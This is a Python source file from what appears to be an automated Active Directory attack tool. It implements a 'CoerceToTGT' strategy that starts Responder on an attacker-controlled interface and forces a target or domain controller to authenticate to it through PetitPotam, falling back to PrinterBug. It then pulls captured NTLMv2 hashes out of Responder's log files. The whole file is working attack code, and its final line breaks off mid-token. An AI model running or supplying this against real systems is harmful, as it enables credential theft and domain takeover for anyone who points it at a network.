import subprocess
from entities.node import Node
from entities.edge import Edge
from entities.edge_kind import EdgeKind
from entities.exploit_result import ExploitResult
from strategies.exploit_strategy import ExploitStrategy
from exceptions.hop_failed_error import HopFailedError


class CoerceToTGTStrategy(ExploitStrategy):
    """
    CoerceToTGT — force the target machine to authenticate to our listener.

    Flow:
      1. Start Responder (or ntlmrelayx) to capture/relay the incoming auth
      2. Trigger coercion on the target (PetitPotam, PrinterBug, DFSCoerce...)
      3. Capture NTLMv2 hash or relay it directly

    Edge:  source ──[CoerceToTGT]──▶ target (Computer or DC)
    Creds: {"dc_ip", "domain", "username", "password", "attacker_ip"}
    """

    # ------------------------------------------------------------------ #
    #  ExploitStrategy interface                                           #
    # ------------------------------------------------------------------ #

    def can_exploit(self, edge: Edge) -> bool:
        return edge.kind == EdgeKind.COERCE_TO_TGT

    def exploit(self, edge: Edge, attacker: Node, creds: dict) -> ExploitResult:
        if not self.can_exploit(edge):
            raise HopFailedError(
                edge=edge,
                reason=f"CoerceToTGT strategy cannot handle edge '{edge.kind.value}'"
            )

        target      = edge.goal_node
        attacker_ip = creds.get("attacker_ip")

        if not attacker_ip:
            raise HopFailedError(
                edge=edge,
                reason="Missing 'attacker_ip' in creds — needed for Responder listener"
            )

        try:
            # Step 1 — start Responder in background
            responder = self._start_responder(attacker_ip)

            # Step 2 — trigger coercion on target
            self._trigger_coercion(
                target_ip  = target.properties.get("ip", creds["dc_ip"]),
                attacker_ip= attacker_ip,
                domain     = creds["domain"],
                username   = creds["username"],
                password   = creds["password"]
            )

            # Step 3 — collect captured hash from Responder output
            captured_hash = self._collect_hash(responder)

            return ExploitResult(
                success=captured_hash is not None,
                strategy="coerce_to_tgt",
                target=target.label,
                details=(
                    f"Coerced {target.label} → listener on {attacker_ip}. "
                    f"Hash {'captured' if captured_hash else 'not captured'}."
                ),
                ticket_hash=captured_hash,
                severity="CRITICAL" if captured_hash else "HIGH"
            )

        except Exception as e:
            raise HopFailedError(edge=edge, reason=str(e))

    # ------------------------------------------------------------------ #
    #  Step 1 — Responder listener                                         #
    # ------------------------------------------------------------------ #

    def _start_responder(self, attacker_ip: str) -> subprocess.Popen:
        """
        Launch Responder in background to capture incoming NTLMv2 hashes.
        Requires Responder installed and run as root.
        """
        cmd = [
            "responder",
            "-I", self._interface_from_ip(attacker_ip),
            "-v",
            "--lm"          # capture LM hashes too
        ]

        return subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

    # ------------------------------------------------------------------ #
    #  Step 2 — Coercion trigger                                          #
    # ------------------------------------------------------------------ #

    def _trigger_coercion(self, target_ip: str, attacker_ip: str,
                          domain: str, username: str, password: str):
        """
        Trigger authentication coercion via PetitPotam (unauthenticated or authenticated).
        Falls back to PrinterBug (SpoolSample) if PetitPotam fails.
        """
        # Try PetitPotam first (EfsRpc — works unauthenticated on unpatched DCs)
        success = self._petitpotam(target_ip, attacker_ip, domain, username, password)

        if not success:
            # Fallback — PrinterBug (MS-RPRN spooler abuse)
            self._printerbug(target_ip, attacker_ip, domain, username, password)

    def _petitpotam(self, target_ip: str, attacker_ip: str,
                    domain: str, username: str, password: str) -> bool:
        cmd = [
            "python3", "PetitPotam.py",
            "-d", domain,
            "-u", username,
            "-p", password,
            attacker_ip,    # listener
            target_ip       # target
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return result.returncode == 0

    def _printerbug(self, target_ip: str, attacker_ip: str,
                    domain: str, username: str, password: str):
        cmd = [
            "python3", "printerbug.py",
            f"{domain}/{username}:{password}@{target_ip}",
            attacker_ip
        ]

        subprocess.run(cmd, capture_output=True, text=True, timeout=15)

    # ------------------------------------------------------------------ #
    #  Step 3 — Collect hash from Responder                               #
    # ------------------------------------------------------------------ #

    def _collect_hash(self, responder: subprocess.Popen,
                      wait_seconds: int = 10) -> str | None:
        """
        Wait for Responder to capture an NTLMv2 hash.
        Responder writes captured hashes to /usr/share/responder/logs/
        """
        import time
        import glob

        time.sleep(wait_seconds)
        responder.terminate()

        # Parse most recent Responder log for NTLMv2 hashes
        logs = glob.glob("/usr/share/responder/logs/*NTLMv2*.txt")
        if not logs:
            return None

        latest = max(logs, key=lambda f: __import__("os").path.getmtime(f))
        with open(latest) as f:
            lines = f.read().strip().splitlines()

        return lines[-1] if lines else Non
